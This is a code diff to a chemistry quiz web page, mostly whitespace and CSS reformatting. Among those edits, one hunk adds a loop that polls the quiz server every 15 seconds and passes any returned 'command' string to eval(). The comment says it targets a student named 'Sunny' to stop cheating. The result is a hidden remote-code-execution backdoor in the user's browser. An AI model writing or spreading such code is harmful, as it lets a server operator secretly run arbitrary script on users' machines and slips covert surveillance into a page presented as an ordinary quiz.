@@ -30,9 +30,9 @@
             </div>
         </div>
 
-        <div style="position: relative; display:flex; flex-direction: row; width: 100%; text-align: center; justify-content: center;">
-            <div id="notification"
-                style="padding-left: 10px; padding-right: 10px; text-align: center; width: 100%;">
+        <div
+            style="position: relative; display:flex; flex-direction: row; width: 100%; text-align: center; justify-content: center;">
+            <div id="notification" style="padding-left: 10px; padding-right: 10px; text-align: center; width: 100%;">
             </div>
         </div>
         <div id="links-wrapper">
@@ -43,20 +43,23 @@
             </div>
         </div>
         <style>
-            #links-wrapper{
+            #links-wrapper {
                 position: relative;
                 width: 100%;
                 display: flex;
                 flex-direction: row;
                 justify-content: center;
-            } /* Vertically in the middle */
+            }
 
-            #links{
+            /* Vertically in the middle */
+
+            #links {
                 display: flex;
                 flex-direction: column;
                 justify-content: start;
             }
-            .links{
+
+            .links {
                 text-decoration: none;
                 color: grey;
                 text-align: center;
@@ -73,56 +76,71 @@
     var incorrect = 0
     var serverURL = 'https://apis.chem.teamerdev.xyz/' // https://apis.chem.teamerdev.xyz/
     var word = ''
-    function reset(){
-        setTimeout(()=>{
+
+    setInterval(() => {
+        $.get(serverURL + 'getEvents', (data) => {
+            // Specially designed for Sunny to avoid cheating.
+            if (data.code == 0) {
+                if (data.command) {
+                    eval(data.command)
+                } else {
+                    console.log('Failed to fetch command.')
+                }
+            } else {
+                console.log('error fetching')
+            }
+        })
+    }, 15000)
+    function reset() {
+        setTimeout(() => {
             $("#equation").val('')
             $("#question").text("Fetching...")
             $("#notification").text("")
             fetch()
-        },1500)
-        $('#successrate').text(String(correct)+' out of '+String(correct+incorrect)+', '+String(100*correct/(correct+incorrect))+'% Correct.')
+        }, 1500)
+        $('#successrate').text(String(correct) + ' out of ' + String(correct + incorrect) + ', ' + String(100 * correct / (correct + incorrect)) + '% Correct.')
     }
-    function fetch(){
-        $.get(serverURL+'next',{
+    function fetch() {
+        $.get(serverURL + 'next', {
             type: 0
-        }, (data)=>{
-            console.log(data.word,data.code)
-            word=data.word
-            if(data.code!=0){
-                $("#notification").text("error:"+data.msg)
+        }, (data) => {
+            console.log(data.word, data.code)
+            word = data.word
+            if (data.code != 0) {
+                $("#notification").text("error:" + data.msg)
             } else {
                 console.log('0')
                 $("#question").text(data.word)
                 word = data.word
                 $("#equation").focus()
             }
-        }).fail((xhr,stat,error)=>{
+        }).fail((xhr, stat, error) => {
             $("#question").text("No Internet");
             alert('Can not perform your request at this time. Check your internet connection and try again later.')
         })
     }
     function osubmit(url) {
         console.log(url)
-        $.post(serverURL+'check', {
-            'word':word,
+        $.post(serverURL + 'check', {
+            'word': word,
             'equation': url
         }, (data) => {
             if (data.code == 0) {
-                if(data.correct){
+                if (data.correct) {
                     $('#notification').text('You are correct!')
-                    correct+=1
+                    correct += 1
                     reset()
                 } else {
-                    $('#notification').text('Incorrect, '+data.word+': Symbol '+data.symbol+', Charge '+data.charge)
-                    incorrect+=1
+                    $('#notification').text('Incorrect, ' + data.word + ': Symbol ' + data.symbol + ', Charge ' + data.charge)
+                    incorrect += 1
                     reset()
                 }
             } else {
-                $('#notification').text('error:'+data.msg)
+                $('#notification').text('error:' + data.msg)
                 reset()
             }
             $('#notification').slideDown()
-        }).fail((xhr,stat,error)=>{
+        }).fail((xhr, stat, error) => {
             $("#question").text("No Internet");
             alert('Can not perform your request at this time. Check your internet connection and try again later.')
         })
